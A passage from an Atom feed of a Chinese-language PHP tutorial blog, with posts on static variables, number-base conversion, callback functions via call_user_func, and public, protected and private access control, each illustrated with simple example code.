class="comment">//1</span></span><br><span class="line">local(); <span class="comment">//1</span></span><br><span class="line">local(); <span class="comment">//1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'===================================&lt;br/&gt;'</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/** static静态局部变量 */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">static_local</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> $local = <span class="number">0</span> ; <span class="comment">//此处可以不赋0值</span></span><br><span class="line">    $local++;</span><br><span class="line">    <span class="keyword">echo</span> $local . <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line">static_local(); <span class="comment">//1</span></span><br><span class="line">static_local(); <span class="comment">//2</span></span><br><span class="line">static_local(); <span class="comment">//3</span></span><br><span class="line"><span class="comment">//echo $local; 注意虽然静态变量，但是它仍然是局部的，在外不能直接访问的。</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'=======================================&lt;br&gt;'</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/** static静态全局变量(实际上:全局变量本身就是静态存储方式,所有的全局变量都是静态变量) */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">static_global</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $glo; <span class="comment">//此处，可以不赋值0，当然赋值0，后每次调用时其值都为0，每次调用函数得到的值都会是1，但是不能想</span></span><br><span class="line"><span class="comment">//当然的写上"static"加以修饰，那样是错误的.</span></span><br><span class="line">    $glo++;</span><br><span class="line">    <span class="keyword">echo</span> $glo . <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line">static_global(); <span class="comment">//1</span></span><br><span class="line">static_global(); <span class="comment">//2</span></span><br><span class="line">static_global(); <span class="comment">//3</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h5 id="静态局部变量："><a href="#静态局部变量：" class="headerlink" title="静态局部变量："></a>静态局部变量：</h5><p>  1.static类型的内部变量同auto自动变量（即未加static声明的局部变量）一样，是某个特定函数的局部变量，即只能在定义该变量的函数内使用该变量，两者作用域相同；两者的不同在于：<strong>auto自动变量会随着函数被调用和退出而存在和消失，而static类局部变量不会，它不管其所在的函数是否被调用，都将一直存在；不过，尽管该变量还继续存在，但不能使用它。</strong>倘若再次调用定义它的函数时，它又可继续使用，而且保存了前次被调用后的值。换言之，<strong><em>static类型的局部变量是一种只能在某个特定函数中使用，但一直占据储存空间的变量。</em></strong></p><p>  2.函数体内如果在定义静态变量的同时进行了初始化，则以后程序不在进行初始化操作（出现在函数内部的基本类型的静态变量初始化语句只有在第一次调用才执行）。而对自动变量赋初值是在函数调用时进行，每调用一次函数重新给一次初值3，相当于执行一次赋值语句。</p><p>  3.静态局部变量的初始化表达式必须是一个常量表达式。即使局部静态变量定义时没有赋初值，</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;php静态变量&quot;&gt;&lt;a href=&quot;#php静态变量&quot; class=&quot;headerlink&quot; title=&quot;php静态变量&quot;&gt;&lt;/a&gt;php静态变量&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;Static（静态）关键字
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;1.在函数中声明的静态变
      
    
    </summary>
    
    
      <category term="php学习" scheme="https://feng4.github.io/tags/php%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>php进制</title>
    <link href="https://feng4.github.io/2018/10/25/php%E8%BF%9B%E5%88%B6/"/>
    <id>https://feng4.github.io/2018/10/25/php进制/</id>
    <published>2018-10-25T04:30:46.017Z</published>
    <updated>2017-12-02T09:48:21.530Z</updated>
    
    <content type="html"><![CDATA[<h4 id="php进制"><a href="#php进制" class="headerlink" title="php进制"></a>php进制</h4><p><strong>关于进制的表格：</strong></p><table><thead><tr><th>进制</th><th style="text-align:center">缩写</th><th style="text-align:right">单词</th></tr></thead><tbody><tr><td>十进制</td><td style="text-align:center">dec</td><td style="text-align:right">decimalist</td></tr><tr><td>八进制</td><td style="text-align:center">oct</td><td style="text-align:right">otconary</td></tr><tr><td>二进制</td><td style="text-align:center">bin</td><td style="text-align:right">binary</td></tr><tr><td>十六进制</td><td style="text-align:center">hex</td><td style="text-align:right">hexadecimal</td></tr></tbody></table><p><strong>php进制转换函数：</strong><br></p><pre><code>decbin()--------十进制 转 二进制decoct()--------十进制 转 八进制bindec()--------二进制 转 十进制</code></pre><p>我们发现缩写组合一下就是 <em>什么进制</em> 转 <em>什么进制</em>。<br></p><p>php变量中可以存十进制、八进制、十六进制。<br></p><p>php变量5.4之前版本<strong>不能</strong>储存 二进制。</p><p><strong>php进制变量声明：</strong></p><pre><code>$a = 123 //十进制$a = 023 //八进制$a = 0x1A //十六进制</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;php进制&quot;&gt;&lt;a href=&quot;#php进制&quot; class=&quot;headerlink&quot; title=&quot;php进制&quot;&gt;&lt;/a&gt;php进制&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;关于进制的表格：&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;进制&lt;
      
    
    </summary>
    
    
      <category term="php学习" scheme="https://feng4.github.io/tags/php%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>php回调函数</title>
    <link href="https://feng4.github.io/2018/10/25/php%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/"/>
    <id>https://feng4.github.io/2018/10/25/php回调函数/</id>
    <published>2018-10-25T04:30:46.013Z</published>
    <updated>2017-12-04T00:47:44.985Z</updated>
    
    <content type="html"><![CDATA[<h4 id="php回调函数"><a href="#php回调函数" class="headerlink" title="php回调函数"></a>php回调函数</h4><p>回调函数：Callback（即call then back 被主函数调用运算后会返回主函数），是指通过函数参数传递到其他代码的，某一块可执行代码的引用。<br><br>通俗的解释就是把函数作为参数传入进；另一个函数中使用；php中有许多“需求参数为函数”的函数，像array_map,usort,call_user_func_array之类，它们执行传入函数，<br>然后直接将结果返回主函数。好处是函数作为值使用起来方便，而且代码简洁，可读性强。</p><h4 id="php中回调函数的实现"><a href="#php中回调函数的实现" class="headerlink" title="php中回调函数的实现"></a>php中回调函数的实现</h4><p> php提供了两个内置函数call_user_func()和call_user_func_array()提供对回调函数的支持。这两个函数的区别是<br><br>call_user_func_array是以数组的形式接收回调函数的参数的，看它的原型就知道了：mixed call_user_func_array(callable $callback,array $param_arr),它只有两个参数。<br><br>而call_user_func($callback,参数1,,参数2,…)的参数个数根据回调函数的参数来决定的。<br></p><p> 如何实现对脚本中全局函数、类中未使用$this的非静态方法、类中使用$this的非静态方法（需要传入对象）、类中静态方法的回调呢？<br></p><p> 实例代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//普通函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f1</span><span class="params">($arg1,$arg2)</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">__FUNCTION__</span>.<span class="string">'exec,the args is:'</span>.$arg1.<span class="string">' '</span>.$arg2;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过call_user_func调用函数f1</span></span><br><span class="line">call_user_func(<span class="string">'f1'</span>,<span class="string">'han'</span>,<span class="string">'wen'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过call_user_func_array调用函数</span></span><br><span class="line">call_user_func_array(<span class="string">'f1'</span>,<span class="keyword">array</span>(<span class="string">'han'</span>,<span class="string">'wen'</span>));</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $name;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">($arg1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'the arg is:'</span>.$arg1.<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'my name is:'</span>.<span class="keyword">$this</span>-&gt;name;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show1</span><span class="params">($arg1,$arg2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">__METHOD__</span>.<span class="string">'exec,the args is:'</span>.$arg1.<span class="string">' '</span>.$arg2.<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">show2</span><span class="params">($arg1,$arg2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">__METHOD__</span>.<span class="string">'of class A exec,the args is:'</span>.$arg1.<span class="string">' '</span>.$arg2.<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//调用类中非静态成员函数，该成员函数中有$this调用了对象中的成员</span></span><br><span class="line">$a = <span class="keyword">new</span> A;</span><br><span class="line">$a-&gt;name = <span class="string">'wen'</span>;</span><br><span class="line">call_user_func_array(<span class="keyword">array</span>($a,<span class="string">'show'</span>),<span class="keyword">array</span>(<span class="string">'han!'</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用类中非静态成员函数，没有对象被创建，该成员函数中不能有$this</span></span><br><span class="line">call_user_func_array(<span class="keyword">array</span>(<span class="string">'A'</span>,<span class="string">'show1'</span>),<span class="keyword">array</span>(<span class="string">'an!'</span>,<span class="string">'wen'</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用中静态成员函数</span></span><br><span class="line">call_user_func_array(<span class="keyword">array</span>(<span class="string">'A'</span>,<span class="string">'show2'</span>),<span class="keyword">array</span>(<span class="string">'argument1'</span>,<span class="string">'argument2'</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;php回调函数&quot;&gt;&lt;a href=&quot;#php回调函数&quot; class=&quot;headerlink&quot; title=&quot;php回调函数&quot;&gt;&lt;/a&gt;php回调函数&lt;/h4&gt;&lt;p&gt;回调函数：Callback（即call then back 被主函数调用运算后会返回主函数），是指通
      
    
    </summary>
    
    
      <category term="php学习" scheme="https://feng4.github.io/tags/php%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>php访问控制</title>
    <link href="https://feng4.github.io/2018/10/25/php%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/"/>
    <id>https://feng4.github.io/2018/10/25/php访问控制/</id>
    <published>2018-10-25T04:30:46.009Z</published>
    <updated>2017-12-01T15:22:03.495Z</updated>
    
    <content type="html"><![CDATA[<h3 id="访问控制（可见性）"><a href="#访问控制（可见性）" class="headerlink" title="访问控制（可见性）"></a>访问控制（可见性）</h3><hr><p>对属性或方法的访问控制，是通过在前面添加关键字public（公有），protected（受保护）或private（私有）来实现的。被定义为公有的类成员可以在任何地方被访问。被定义为受保护的类成员则可以被其自身以及其子类和父类访问。被定义为私有的类成员则只能被其定义所在的类访问。</p><h4 id="属性的访问控制"><a href="#属性的访问控制" class="headerlink" title="属性的访问控制"></a>属性的访问控制</h4><hr><p>类属性必须定义为公有，受保护，私有之一。如果用<em>var</em>定义，则被视为公有。</p><p>#####属性声明：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 定义类 MyClass</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $public = <span class="string">'Public(公有)'</span>;</span><br><span class="line"><span class="keyword">protected</span> $protected = <span class="string">'Protected(受保护)'</span>;</span><br><span class="line"><span class="keyword">private</span> $private = <span class="string">'Private(私有)'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printHello</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;public;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;protected;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;private;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$obj = <span class="keyword">new</span> MyClass();</span><br><span class="line"><span class="keyword">echo</span> $obj-&gt;public;   <span class="comment">//这行能被正常执行</span></span><br><span class="line"><span class="keyword">echo</span> $obj-&gt;protected; <span class="comment">//这行会产生一个致命错误</span></span><br><span class="line"><span class="keyword">echo</span> $obj-&gt;private; <span class="comment">//这行也会产生一个致命错误</span></span><br><span class="line">$obj-&gt;printHello(); <span class="comment">//输出 Public(公有)、Protected(受保护) 和 Private(私有)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 定义类 MyClass2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass2</span> <span class="keyword">extends</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//可以对 public 和 protected 进行重定义，但 private 不能</span></span><br><span class="line"><span class="keyword">protected</span> $protected = <span class="string">'Protected2(受保护)'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printHello</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;public;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;protected;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;private;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$obj2 = <span class="keyword">new</span> MyClass2();</span><br><span class="line"><span class="keyword">echo</span> $obj2-&gt;public; <span class="comment">//这行能被执行</span></span><br><span class="line"><span class="keyword">echo</span> $obj2-&gt;private; <span class="comment">//未定义 private</span></span><br><span class="line"><span class="keyword">echo</span> $obj2-&gt;protected; <span class="comment">//这行会产生一个致命错误</span></span><br><span class="line">$obj2-&gt;printHello(); <span class="comment">//输出 Public、Protected2(受保护)、和 Undefined</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="方法的访问控制"><a href="#方法的访问控制" class="headerlink" title="方法的访问控制"></a>方法的访问控制</h4><hr><p>类中的方法可以被定义为公有，私有或受保护。如果没有设置这些关键字，则该方法默认为公有。</p><h5 id="方法声明："><a href="#方法声明：" class="headerlink" title="方法声明："></a>方法声明：</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *定义类 MyClass</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//声明一个公有的构造函数</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//声明一个公有的方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">MyPublic</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//声明一个受保护的方法</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">MyProtected</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//声明一个私有的方法</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">MyPrivate</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//此方法为公有</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;MyPublic();</span><br><span class="line"><span class="keyword">$this</span>-&gt;MyProtected();</span><br><span class="line"><span class="keyword">$this</span>-&gt;MyPrivate();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$myclass = <span class="keyword">new</span> MyClass;</span><br><span class="line">$myclass-&gt;MyPublic(); <span class="comment">//这行能被正常执行</span></span><br><span class="line">$myclass-&gt;MyProtected(); <span class="comment">//这行会产生一个致命错误</span></span><br><span class="line">$myclass-&gt;MyPrivate(); <span class="comment">//这行会产生一个致命错误</span></span><br><span class="line">$myclass-&gt;Foo();  <span class="comment">//公有，受保护，私有都可执行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *定义类 MyClass2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass2</span> <span class="keyword">extends</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//此方法为公有</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;MyPublic();</span><br><span class="line"><span class="keyword">$this</span>-&gt;MyProtected();</span><br><span class="line"><span class="keyword">$this</span>-&gt;MyPrivate(); <span class="comment">//这行会产生一个致命错误</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$myclass2 = <span class="keyword">new</span> MyClass2;</span><br><span class="line">$myclass2-&gt;MyPublic(); <span class="comment">//这行能被正常执行</span></span><br><span class="line">$myclass2-&gt;Foo2(); <span class="comment">//公有的和受保护的都可执行，但私有的不行</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bar</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;testPrivate();</span><br><span class="line"><span class="keyword">$this</span>-&gt;testPublic();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">testPublic</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Bar::testPublic\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">testPrivate</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Bar::testPrivate\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span> <span class="keyword">extends</span> <span class="title">Bar</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">testPublic</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Foo::testPublic\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">testPrivate</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Foo::testPrivate\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$myFoo = <span class="keyword">new</span> foo();</span><br><span class="line">$myFoo-&gt;test(); <span class="comment">//Bar::testPrivate</span></span><br><span class="line">                <span class="comment">//Foo::testPublic</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;访问控制（可见性）&quot;&gt;&lt;a href=&quot;#访问控制（可见性）&quot; class=&quot;headerlink&quot; title=&quot;访问控制（可见性）&quot;&gt;&lt;/a&gt;访问控制（可见性）&lt;/h3&gt;&lt;hr&gt;
&lt;p&gt;对属性或方法的访问控制，是通过在前面添加关键字public（公有），pro
      
    
    </summary>
    
    
      <category term="php学习" scheme="https://feng4.github.io/tags/php%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="public（公有）" scheme="https://feng4.github.io/tags/public%EF%BC%88%E5%85%AC%E6%9C%89%EF%BC%89/"/>
    
      <category term="protected（受保护）" scheme="https://feng4.github.io/tags/protected%EF%BC%88%E5%8F%97%E4%BF%9D%E6%8A%A4%EF%BC%89/"/>
    
      <category term="private（私有）" scheme="https://feng4.github.io/tags/private%EF%BC%88%E7%A7%81%E6%9C%89%EF%BC%89/"/>
    
  </entry>
  
</feed>
